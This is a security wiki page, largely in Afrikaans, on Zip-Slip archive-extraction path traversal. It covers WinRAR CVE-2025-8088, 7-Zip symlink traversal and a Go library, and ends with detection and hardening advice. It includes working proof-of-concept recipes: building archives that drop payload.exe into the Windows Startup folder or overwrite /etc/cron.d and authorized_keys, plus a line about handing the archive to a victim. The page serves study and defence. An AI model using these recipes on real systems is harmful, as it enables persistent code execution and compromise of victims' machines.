# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Oorsig

Baie archive-formate (ZIP, RAR, TAR, 7-ZIP, ens.) laat elke entry toe om sy eie **interne path** te bevat. Wanneer ’n extraction utility daardie path blindelings respekteer, sal ’n crafted filename wat `..` of ’n **absolute path** (bv. `C:\Windows\System32\`) bevat, buite die user-chosen directory geskryf word.
Hierdie klas kwesbaarheid staan algemeen bekend as *Zip-Slip* of **archive extraction path traversal**.

Gevolge wissel van die oorskryf van arbitrary files tot die direkte bereiking van **remote code execution (RCE)** deur ’n payload in ’n **auto-run**-ligging te plaas, soos die Windows *Startup*-folder.

## Oorsaak

1. Attacker creates ’n archive waarin een of meer file headers die volgende bevat:
* Relative traversal sequences (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Absolute paths (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Of crafted **symlinks** wat buite die target dir resolve (algemeen in ZIP/TAR op *nix).
2. Victim extract die archive met ’n vulnerable tool wat die embedded path vertrou (of symlinks volg) in plaas daarvan om dit te sanitise of extraction onder die gekose directory af te dwing.
3. Die file word in die attacker-controlled location geskryf en uitgevoer/gelaai wanneer die system of user daardie path volgende keer trigger.

### .NET `Path.Combine` + `ZipArchive` traversal

’n Algemene .NET anti-pattern is om die beoogde destination met user-controlled `ZipArchiveEntry.FullName` te combineer en extraction sonder path normalisation uit te voer:<sup>[[4]](#references)</sup>
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- As `entry.FullName` met `..\\` begin, traverseer dit; as dit ’n **absolute path** is, word die linkerkantste komponent heeltemal weggegooi, wat ’n **arbitrary file write** as the extraction identity oplewer.
- Proof-of-concept-argief om na ’n aanliggende `app`-gids te skryf wat deur ’n geskeduleerde scanner gemonitor word:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Deur daardie ZIP in die gemonitorde inbox te plaas, word `C:\samples\app\0xdf.txt` geskep, wat traversal buite `C:\samples\queue\` bewys en opvolgprimitiewe moontlik maak (bv. DLL hijacks).

## Werklike voorbeeld – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR vir Windows (insluitend die `rar` / `unrar` CLI, die DLL en die portable source) het versuim om lêernaam tydens extraction te valideer.
'n Kwaadwillige RAR-archive met 'n inskrywing soos:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
sou uiteindelik **buite** die geselekteerde uitvoergids en binne die gebruiker se *Startup*-lêergids beland. Ná aanmelding voer Windows outomaties alles uit wat daar teenwoordig is, wat *volgehoue* RCE moontlik maak.<sup>[[5]](#references)</sup>

### Skep van 'n PoC-argief (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Opsies wat gebruik is:
* `-ep`  – stoor lêerpaaie presies soos gegee (moenie vooraanstaande `./` verwyder nie).

Lewer `evil.rar` aan die slagoffer en gee hulle opdrag om dit met ’n kwesbare WinRAR-build uit te pak.

### Waargenome Exploitation in die Wild

ESET het spear-phishing-veldtogte deur RomCom (Storm-0978/UNC2596) gerapporteer waarin RAR-argiewe aangeheg is wat CVE-2025-8088 misbruik het om pasgemaakte backdoors te ontplooi en ransomware-bedrywighede te fasiliteer.<sup>[[5]](#references)</sup>

## Nuwer Gevalle (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Fout**: ZIP-inskrywings wat **symbolic links** was, is tydens extraction gedereferenceer, wat aanvallers toegelaat het om uit die destination directory te ontsnap en arbitrêre paaie te oorskryf. User interaction is slegs om die argief *oop te maak/uit te pak*.<sup>[[1]](#references)</sup>
* **Geaffekteer**: 7-Zip 21.02–24.09 (Windows- en Linux-builds). Reggestel in **25.00** (Julie 2025) en later.
* **Impact path**: Oorskryf `Start Menu/Programs/Startup` of service-run-liggings → code loop tydens die volgende logon of service restart.
* **Vinnige PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
Op ’n patched build sal `/etc/cron.d` nie aangeraak word nie; die symlink word as ’n link binne `/tmp/target` uitgepak.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Fout**: `archiver.Unarchive()` volg `../` en symlinked ZIP-inskrywings en skryf buite `outputDir`.<sup>[[2]](#references)</sup>
* **Geaffekteer**: `github.com/mholt/archiver` ≤ 3.5.1 (die projek is nou deprecated).
* **Regstelling**: Skakel oor na `mholt/archives` ≥ 0.1.0 of implementeer canonical-path checks voor die write.
* **Minimale reproduksie**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Detection Tips

* **Statiese inspeksie** – Lys argief-inskrywings en vlag enige naam wat `../`, `..\\`, *absolute paths* (`/`, `C:`) bevat, of inskrywings van tipe *symlink* waarvan die teiken buite die extraction dir is.
* **Canonicalisation** – Verseker dat `realpath(join(dest, name))` steeds met `dest` begin. Verwerp dit andersins.<sup>[[3]](#references)</sup>
* **Sandbox extraction** – Decomprimeer na ’n weggooibare directory met ’n *safe* extractor (bv. `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) en verifieer dat die resulterende paaie binne die directory bly.
* **Endpoint monitoring** – Genereer ’n alert wanneer nuwe executables na `Startup`/`Run`/`cron`-liggings geskryf word kort nadat ’n argief deur WinRAR/7-Zip/ens. oopgemaak is.

## Mitigation & Hardening

1. **Werk die extractor by** – WinRAR 7.13+ en 7-Zip 25.00+ implementeer path/symlink sanitisation. Albei tools het steeds nie auto-update nie.
2. Pak argiewe uit met “**Moenie paaie uitpak nie**” / “**Ignoreer paaie**” wanneer moontlik.
3. Laat op Unix privileges verval en mount ’n **chroot/namespace** voor extraction; gebruik op Windows **AppContainer** of ’n sandbox.
4. Indien jy custom code skryf, normaliseer met `realpath()`/`PathCanonicalize()` **voor** create/write, en verwerp enige inskrywing wat uit die destination ontsnap.

## Addisionele / Historiese Gevalle

* 2018 – Massiewe *Zip-Slip*-advisory deur Snyk wat baie Java/Go/JS-libraries geraak het.
* 2023 – 7-Zip CVE-2023-4011 met soortgelyke traversal tydens `-ao` merge.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) TAR extraction traversal in slugs (patch in v1.2).
* Enige custom extraction logic wat nie `PathCanonicalize` / `realpath` voor write aanroep nie.

## References

- [1] [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [2] [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [3] [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [4] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [ESET Research – Update WinRAR tools now: RomCom and others exploiting zero-day vulnerability (CVE-2025-8088)](https://www.welivesecurity.com/en/eset-research/update-winrar-tools-now-romcom-and-others-exploiting-zero-day-vulnerability/)

{{#include ../banners/hacktricks-training.md}}
